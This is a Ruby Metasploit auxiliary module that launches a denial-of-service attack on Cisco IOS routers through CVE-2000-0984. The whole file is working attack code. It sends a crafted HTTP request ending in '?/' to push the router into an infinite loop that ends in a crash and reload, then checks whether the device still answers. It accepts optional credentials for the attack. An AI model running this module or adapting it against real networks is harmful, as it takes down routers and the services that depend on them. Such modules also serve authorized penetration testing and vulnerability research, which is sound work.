##
# $Id$
##

require 'msf/core'

module Msf

class Auxiliary::Dos::Cisco::IOS_HTTP_Question_DoS < Msf::Auxiliary

	include Exploit::Remote::HttpClient

	def initialize
		super(
			'Name'		=> 'Cisco IOS HTTP ?/ Denial of Service',
			'Description'	=> %q{
			As of Cisco IOS Software Release 12.0T, the meaning of a question mark when it appears adjacent to a "/" (slash) character cannot be determined properly by the URI parser in affected versions of Cisco IOS software. When a URI containing "?/" is presented to the HTTP service on the router and a valid enable password is supplied, the router enters an infinite loop. A watchdog timer expires two minutes later and forces the router to crash and reload.

			This vulnerability may only be exploited if the enable password is not set, it is well known, or it can be guessed.
			},
			'Author'	=> 'grutz',
			'License'	=> BSD_LICENSE,
			'Version'	=> '$Rev$',
			'References'	=> [
						['BID', '1838'],
						['OSVDB', '6717'],
						['CVE', '2000-0984'],
						['URL', 'http://www.cisco.com/warp/public/707/ioshttpserverquery-pub.shtml'],
			]
		)

		register_options(
			[
				OptString.new('ENABLE', [ false, 'Enable Password (if needed)' ]),
				Opt::RPORT(80),
				OptString.new('USER', [ false, 'Username (optional)'] ),
				OptString.new('PASS', [ false, 'Password (optional)'] ),
			], self.class
		)
	end

	def run

		rawtext = Rex::Text::rand_text_alpha(rand(20) + 1)
		user = datastore['USER']
		pass = datastore['PASS']
		if (user == nil && pass == nil)
			auth_str = ''
		else
			auth_str = "#{user}:#{pass}"
		end

		print_status("Sending DoS string...")
		res = send_request_raw({'uri' => '/' + rawtext + '?/'}, 1)
		print_status("Checking to see if device is still alive...")
		begin
			res = send_request_raw(
				{
					'uri' => '/',
					'basic_auth' => auth_str ? auth_str : '',
				}, 1)
			print_status("Received:\n\n#{res.body}")
		rescue
			print_status("Router DoSed")
		end
	end

end
end
